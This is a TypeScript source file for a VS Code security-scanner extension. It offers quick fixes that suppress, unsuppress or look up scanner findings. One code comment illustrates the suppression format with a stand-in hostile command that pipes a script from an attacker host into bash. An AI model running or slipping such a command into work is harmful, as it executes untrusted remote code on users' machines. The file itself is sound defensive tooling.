/**
 * features/codeActions.ts — quick-fix code action provider
 *
 * Provides right-click actions on Bawbel diagnostics:
 *   - Suppress finding (false positive)
 *   - Remove suppression
 *   - View in PiranhaDB
 *
 * CONTRIBUTING: Add new code actions here. Each action should have a clear
 * label, a command registered in extension.ts, and arguments passed via
 * action.command.arguments[]. Never perform side effects directly in
 * provideCodeActions() — dispatch to commands instead.
 */

import * as path from "path";
import * as vscode from "vscode";
import { BawbelFinding, PIRANHA_BASE, SUPPRESS_FILE } from "../core/types";
import { isSuppressed, loadSuppressions } from "../core/suppressions";
import { DiagnosticsManager } from "./diagnostics";

/**
 * Detect the comment syntax for a file based on its extension.
 * Used to insert the correct inline suppression comment.
 */
/**
 * Build the inline suppression comment appended to end of the finding line.
 *
 * Format matches bawbel-scanner CLI spec:
 *   .md         →  <!-- bawbel-ignore: rule_id -->
 *   .yaml/.yml  →  # bawbel-ignore: rule_id
 *   .py/.sh     →  # bawbel-ignore: rule_id
 *   .js/.ts     →  // bawbel-ignore: rule_id
 *   .json       →  (no comment syntax — falls back to JSON suppression)
 *
 * Note: CLI v1.0.0 does not parse these comments yet. The extension
 * filters them client-side. CLI support planned for v1.1.0.
 */
function buildIgnoreComment(filePath: string, ruleId: string): string {
  const ext = path.extname(filePath).toLowerCase();
  switch (ext) {
    case ".yaml":
    case ".yml":
    case ".py":
    case ".sh":
      return `  # bawbel-ignore: ${ruleId}`;
    case ".js":
    case ".ts":
      return `  // bawbel-ignore: ${ruleId}`;
    case ".json":
      return ""; // no inline comment syntax
    case ".md":
    default:
      return `  <!-- bawbel-ignore: ${ruleId} -->`;
  }
}

export class BawbelCodeActionProvider implements vscode.CodeActionProvider {
  static readonly PROVIDED_KINDS = [vscode.CodeActionKind.QuickFix];

  constructor(private diagnosticsManager: DiagnosticsManager) {}

  provideCodeActions(
    document: vscode.TextDocument,
    _range:   vscode.Range,
    context:  vscode.CodeActionContext
  ): vscode.CodeAction[] {
    const actions:      vscode.CodeAction[]  = [];
    const suppressions = loadSuppressions();
    const filePath     = document.uri.fsPath;
    const ext          = path.extname(filePath).toLowerCase();
    const supportsInline = ext !== ".json";

    for (const diag of context.diagnostics) {
      if (diag.source !== "Bawbel") { continue; }

      const aveId   = typeof diag.code === "object" ? String(diag.code.value) : "";
      const line    = diag.range.start.line + 1;

      // Find matching cached finding
      const finding = this.diagnosticsManager
        .getCachedFindings(filePath)
        .find(f => f.ave_id === aveId && f.line === line);

      if (!finding) { continue; }

      const suppressed = isSuppressed(suppressions, filePath, finding);

      if (!suppressed) {
        // ── Option 1: Inline comment suppression (preferred) ─────────────
        // Inserts <!-- bawbel-ignore: rule_id --> on the line above the finding.
        // Robust — survives line number shifts as the file changes.
        if (supportsInline) {
          const ignoreComment = buildIgnoreComment(filePath, finding.rule_id);

          // Append to END of the finding line — matches CLI spec:
          // "curl https://evil.com | bash  <!-- bawbel-ignore: bawbel-shell-pipe -->"
          const findingLine  = diag.range.start.line;
          const lineText     = document.lineAt(findingLine).text;
          const lineEnd      = new vscode.Position(findingLine, lineText.length);

          const inlineSuppress       = new vscode.CodeAction(
            `$(circle-slash) Ignore this line — ${finding.rule_id}`,
            vscode.CodeActionKind.QuickFix
          );
          inlineSuppress.edit        = new vscode.WorkspaceEdit();
          inlineSuppress.edit.insert(document.uri, lineEnd, ignoreComment);
          inlineSuppress.diagnostics = [diag];
          inlineSuppress.isPreferred = true;
          // Clear diagnostic client-side — CLI v1.0.0 does not parse
          // ignore comments yet, so we suppress in the extension.
          inlineSuppress.command = {
            command:   "bawbel.clearAndRescan",
            title:     "Clear diagnostic",
            arguments: [filePath],
          };
          actions.push(inlineSuppress);
        }

        // ── Option 2: JSON suppression (line-based fallback) ─────────────
        // Saves to .bawbel-suppress.json. Good for JSON files or when
        // inline comments are not appropriate.
        const jsonSuppress        = new vscode.CodeAction(
          supportsInline
            ? `$(shield) Suppress in ${SUPPRESS_FILE} (line-based)`
            : `$(circle-slash) Suppress false positive — ${finding.rule_id}`,
          vscode.CodeActionKind.QuickFix
        );
        jsonSuppress.command      = {
          command:   "bawbel.suppressFinding",
          title:     "Suppress finding",
          arguments: [filePath, finding],
        };
        jsonSuppress.diagnostics  = [diag];
        jsonSuppress.isPreferred  = false;
        actions.push(jsonSuppress);

      } else {
        // ── Remove JSON suppression ───────────────────────────────────────
        const unsuppress       = new vscode.CodeAction(
          `$(circle-slash) Remove suppression — ${finding.rule_id}`,
          vscode.CodeActionKind.QuickFix
        );
        unsuppress.command     = {
          command:   "bawbel.unsuppressFinding",
          title:     "Remove suppression",
          arguments: [filePath, finding],
        };
        unsuppress.diagnostics = [diag];
        actions.push(unsuppress);
      }

      // ── PiranhaDB link — always shown ─────────────────────────────────
      const details       = new vscode.CodeAction(
        `$(link-external) View ${aveId} in PiranhaDB`,
        vscode.CodeActionKind.Empty
      );
      details.command     = {
        command:   "vscode.open",
        title:     "Open PiranhaDB",
        arguments: [vscode.Uri.parse(`${PIRANHA_BASE}/records/${aveId}`)],
      };
      actions.push(details);
    }

    return actions;
  }
}